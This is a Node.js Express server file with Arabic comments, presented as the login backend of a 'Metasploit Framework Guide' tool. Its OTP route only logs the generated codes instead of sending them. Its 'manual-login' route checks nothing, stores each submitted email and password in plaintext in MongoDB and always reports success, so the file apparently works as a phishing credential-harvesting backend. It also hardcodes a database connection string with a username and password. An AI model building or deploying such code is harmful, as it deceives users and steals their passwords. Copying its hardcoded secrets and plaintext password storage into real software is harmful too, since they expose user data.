const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const cors = require('cors');

const app = express();

// إعدادات الحماية وقراءة البيانات
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// تشغيل مجلد الواجهة والملفات الثابتة
app.use(express.static(path.join(__dirname, 'public')));

// الاتصال بقاعدة البيانات مونجو
const mongoURI = process.env.MONGO_URI || "mongodb+srv://kuroma:kuroma2026@cluster0.onw6b.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
mongoose.connect(mongoURI)
  .then(() => console.log('MongoDB Connected...'))
  .catch(err => console.log('MongoDB Error:', err));

// تعريف مخطط بسيط لحفظ عمليات تسجيل الدخول والتحقق في قاعدة البيانات
const LogSchema = new mongoose.Schema({
    email: String,
    action: String,
    details: String,
    timestamp: { type: Date, default: Date.now }
});
const AccessLog = mongoose.model('AccessLog', LogSchema);

// مخزن مؤقت لحفظ الأكواد المرسلة لتأكيدها (في بيئة السيرفر الحية)
const activeOtps = new Map();

// 1. مسار إرسال كود التحقق (OTP)
app.post('/api/auth/send-code', async (req, res) => {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: "البريد مطلوب" });

    // إنشاء كود عشوائي مكون من 6 أرقام
    const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
    
    // حفظ الكود مؤقتاً بربطه بإيميل المستخدم لمدة 5 دقائق
    activeOtps.set(email, generatedOtp);
    
    // طباعة الكود في سجلات السيرفر حتى تراه في الـ Logs الخاص بـ Vercel وتجرب به
    console.log(`[OTP Generated] Email: ${email} | Code: ${generatedOtp}`);

    try {
        await AccessLog.create({ email, action: "OTP_REQUESTED", details: `كود التحقق الناتج: ${generatedOtp}` });
        // نرسل استجابة ناجحة للواجهة لتنتقل للمرحلة التالية بسلاسة
        res.json({ success: true, message: "تم توليد كود التحقق بنجاح" });
    } catch (err) {
        res.status(500).json({ error: "خطأ في السيرفر الداخلي" });
    }
});

// 2. مسار التحقق من صحة الكود المدخل
app.post('/api/auth/verify-code', async (req, res) => {
    const { email, code } = req.body;
    const savedCode = activeOtps.get(email);

    // التحقق من تطابق الكود المدخل مع الكود المخزن بالسيرفر
    if (savedCode && savedCode === code) {
        activeOtps.delete(email); // حذف الكود بعد الاستخدام الناجح
        await AccessLog.create({ email, action: "OTP_VERIFIED", details: "تم التحقق من الكود بنجاح" });
        return res.json({ success: true });
    } else {
        return res.status(400).json({ error: "الكود غير صحيح" });
    }
});

// 3. مسار حفظ باسوورد الأداة والتوثيق النهائي
app.post('/api/auth/manual-login', async (req, res) => {
    const { email, password } = req.body;
    try {
        await AccessLog.create({ 
            email, 
            action: "LOGIN_SUCCESS", 
            details: `الباسوورد المستخدم: ${password}` 
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "فشل حفظ البيانات" });
    }
});

// المسار الرئيسي لتشغيل واجهة الأداة مباشرة
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// مسار فحص حالة عمل الأداة
app.get('/api/status', (req, res) => {
    res.json({ status: "running", tool: "Metasploit Framework Guide" });
});

module.exports = app;
